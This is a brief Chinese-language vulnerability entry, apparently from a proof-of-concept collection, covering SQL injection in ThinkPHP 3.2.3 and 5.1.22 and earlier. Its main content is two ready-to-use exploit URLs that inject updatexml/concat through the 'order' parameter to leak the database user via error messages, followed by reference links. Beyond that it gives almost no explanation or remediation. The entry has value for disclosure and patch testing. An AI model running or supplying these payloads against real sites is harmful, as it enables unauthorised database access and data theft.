## 漏洞类型

- SQLI

## 影响范围

ThinkPHP 3.2.3、5.1.22及以下版本

## POC|EXP

```txt
# ThinkPHP 3.2.3
http://127.0.0.1/ThinkPHP/?order[updatexml(1,concat(0x3a,user()),1)]=1

# ThinkPHP 5.1.22
http://127.0.0.1/tp5/public/index/index/test/index?order[id`|updatexml(1,concat(0x3a,user()),1)%23]=1
```

## 参考链接


> https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w
>
> https://www.seebug.org/vuldb/ssvid-97512